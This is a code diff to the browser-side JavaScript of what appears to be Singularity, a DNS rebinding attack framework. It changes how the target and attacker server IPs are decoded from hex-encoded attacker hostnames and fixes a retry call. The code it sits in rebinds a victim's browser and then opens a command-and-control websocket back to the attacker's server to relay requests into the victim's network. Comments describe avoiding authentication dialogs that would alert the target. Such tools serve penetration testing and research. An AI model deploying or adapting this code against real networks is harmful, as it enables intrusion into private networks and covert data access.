@@ -202,15 +202,112 @@ function timeout(ms, promise, controller) {
 }
 
 function begin(url) {
+    // s-hexstring1.hexstring2-session-method-e.attackerdomain
     const hostnameEl = document.getElementById('hostname');
     const arr = window.location.hostname.split('-');
+    const sourceTarget = arr[1].split('.');
+    const target = decodeIpHexString(sourceTarget[1]);
     const port = document.location.port ? document.location.port : '80';
-    hostnameEl.innerText = `target: ${arr[2]}:${port}, session: ${arr[3]}, strategy: ${arr[4]}`;
+    hostnameEl.innerText = `target: ${target}:${port}, session: ${arr[2]}, strategy: ${arr[3]}`;
     r = Rebinder();
     r.init(url, attack);
 }
 
 function wait(n) { return new Promise(resolve => setTimeout(resolve, n)); }
+
+
+// Helper functions for Command and Control via websockets
+function decodeIpHexString(hexString) {
+    // Validate hexString length
+    if (typeof hexString !== 'string') {
+      throw new Error("Input must be a string");
+    }
+
+    const len = hexString.length;
+    if (len !== 8 && len !== 32) {
+      throw new Error(`Invalid hexstring length: ${len}. Must be 8 or 32.`);
+    }
+
+    if (!/^[0-9A-Fa-f]+$/.test(hexString)) {
+      throw new Error("Hexstring contains invalid characters");
+    }
+
+    const bytes = new Uint8Array(len / 2);
+    for (let i = 0; i < len; i += 2) {
+      bytes[i / 2] = parseInt(hexString.slice(i, i + 2), 16);
+    }
+
+    if (bytes.length === 4) {
+      return bytes.join('.');
+    } else {
+      return toIPv6String(bytes);
+    }
+  }
+
+  function toIPv6String(bytes) {
+    if (bytes.length !== 16) {
+      throw new Error("toIPv6String requires a 16-byte Uint8Array");
+    }
+
+    // Break into 8 groups of 16 bits
+    const groups = new Array(8);
+    for (let i = 0; i < 8; i++) {
+      groups[i] = ((bytes[i * 2] << 8) | (bytes[i * 2 + 1])).toString(16);
+    }
+
+    // Now we have an array of 8 hex strings, e.g. ["2a01", "7e00", "0", "0", "f03c", "91ff", "fe89", "2b5c"]
+    // We need to find the longest run of zero groups and compress them into '::'
+
+    // Find the longest run of consecutive "0" groups.
+    let bestStart = -1;
+    let bestLength = 0;
+
+    let currentStart = -1;
+    let currentLength = 0;
+
+    for (let i = 0; i < 8; i++) {
+      if (groups[i] === '0') {
+        if (currentStart === -1) {
+          currentStart = i;
+          currentLength = 1;
+        } else {
+          currentLength++;
+        }
+      } else {
+        if (currentStart !== -1) {
+          // We ended a run of zeros
+          if (currentLength > bestLength) {
+            bestStart = currentStart;
+            bestLength = currentLength;
+          }
+          currentStart = -1;
+          currentLength = 0;
+        }
+      }
+    }
+    // Check if the last run ends at the end
+    if (currentStart !== -1 && currentLength > bestLength) {
+      bestStart = currentStart;
+      bestLength = currentLength;
+    }
+
+    // If we found a run of at least two zeros, compress them
+    if (bestLength > 1) {
+      const replacement = "::";
+      // groups[bestStart .. bestStart+bestLength-1] are "0"
+      const compressed = [
+        groups.slice(0, bestStart).join(":"),  // before zeros
+        groups.slice(bestStart + bestLength).join(":")  // after zeros
+      ].filter(Boolean).join(replacement);
+
+      // If all groups were zero => "::"
+      return compressed === "" ? "[::]" : `[${compressed}]`;
+    } else {
+      // No compressible run found => just join all groups
+      return `[${groups.join(":")}]`;
+    }
+  }
+
 
 // Request target to establish a websocket to Singularity server and wait for commands
 // Implements retries to handle multiple answer strategy and firewall blocks.
@@ -220,7 +317,9 @@ function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
         return;
     }
 
-    const serverIp = document.location.hostname.split('-')[1]
+    const partOne = document.location.hostname.split('-')[1]
+    const partTwo = partOne.split('.')[0]
+    const serverIp = decodeIpHexString(partTwo)
     const wsurl = `${serverIp}:${wsProxyPort}`
     let httpAuth = false;
 
@@ -234,12 +333,12 @@ function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
     ws.onmessage = function (m) {
         const data = JSON.parse(m.data);
 
-        // if our first rebinding request required HTTP Auth, 
+        // if our first rebinding request required HTTP Auth,
         // choose to not pass cookies between target and victim from now on,
-        // as fetch() credential = 'include' will trigger a dialog box 
+        // as fetch() credential = 'include' will trigger a dialog box
         // if HTTP auth is required in target's browser
         // therefore informing target of ongoing attack.
-        // Could be a problem if CSRF tokens are passed in cookies... 
+        // Could be a problem if CSRF tokens are passed in cookies...
         if (httpAuth === true) {
             data.payload.fetchrequest.credentials = 'omit';
         }
@@ -299,7 +398,7 @@ function webSocketHook(headers, initialCookie, wsProxyPort, retry) {
     wait(1000)
         .then(() => {
             if (ws.readyState !== 1) {
-                webSocketHook(initialCookie, wsProxyPort, retry - 1);
+                webSocketHook(headers, initialCookie, wsProxyPort, retry - 1);
             } else {
                 console.log(`Successfully connected to Singularity via websockets for: ${window.location.host}`);
             }
